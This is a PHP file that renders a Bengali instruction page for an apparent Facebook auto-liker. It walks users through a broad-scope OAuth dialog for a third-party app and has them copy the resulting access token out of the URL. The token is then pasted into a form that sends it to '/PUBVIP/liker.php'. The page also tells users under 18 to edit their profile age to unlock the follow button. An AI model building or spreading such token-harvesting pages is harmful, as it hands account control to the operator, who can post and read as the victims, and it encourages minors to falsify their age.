<?php
echo'<div class="fmenu">গ্রুপ মেম্বার রা আগে পুরোটা পড়ে নিন:<br>
১ম ধাপ) আপনার একাউন্টের ফলোয়ার অপশন চালু আছে কিনা 
সেটিংস থেকে তা চেক করে নিন ।।<br/>
সাধারনত ১৮ বছরের নিচে হলে ফেসবুক কতৃপক্ষ ফলো বাটন দেয় না ।।
<br/>এক্ষেত্রে বয়স প্রফাইল থেকে এডিট করে ফলোবাটন আনতে হবে ।।
<br/>২য় ধাপ) প্রথমে এক্সেস টোকেন সংগ্রহ করুন ।
<a href="https://m.facebook.com/dialog/oauth?redirect_uri=https%3A%2F%2Fpublish.nokia.com%2Flogin%2F__Funbook__&scope=friends_likes%2Cfriends_photos%2Cfriends_status%2Cpublish_actions%2Cpublish_stream%2Cread_stream%2Cstatus_update%2Cuser_about_me%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_photos%2Cuser_status%2Cxmpp_login%2Coffline_access&response_type=token&client_id=200758583311692" class="list1">এখান থেকে এক্সেস টোকেন সংগ্রহ করুন</a> এক্সেস টোকেনে সংগ্রহ করতে গেলে সেখানে কয়েকবার okay দিতে হবে !</br>
এরপর ERROR লেখা পেজ আসবে ।।</br>
<font color="green">পেজটির লিংকটি ব্রাউজারের Page info/address bar থেকে কপি করুন ।<br>লিংকটি দেখতে কিছুটা এইরকম হবে !!</font><br>
publish.nokia.com/login/_Funbook__?#access_token=<font color="red">********* </font>&expires_in=0
<br>
<font color="red">*****</font> দেয়া আংশটুকু হল এক্সেস টোকেন ।
এক্সেস টোকেন দেখতে কিছুটা এমন <br>
<font color="gray">CAAAAPJmB8ZBwB AMZCbdEdiGic QWZAtilSavT y1mUFxmMEZB A1EK009e dktYYGBsWyKA gdLV9tyJgx</font><br>
<font color="green">
মনে রাখবেন accsses_token=এর পর থেকে &expires_in=0 এর আগে পর্যন্ত কপি করতে হবে। <br>
এক্সেস টোকেন সংগ্রহ করে,
এই বক্সে পেস্ট করে লগিন করুন :
<br>
</font> <form method="get" action="/PUBVIP/liker.php"><input type="text" name="accesstoken" class="input"><br>
<input class="bmenu" type="submit" value="login">
</form></div>';
?>
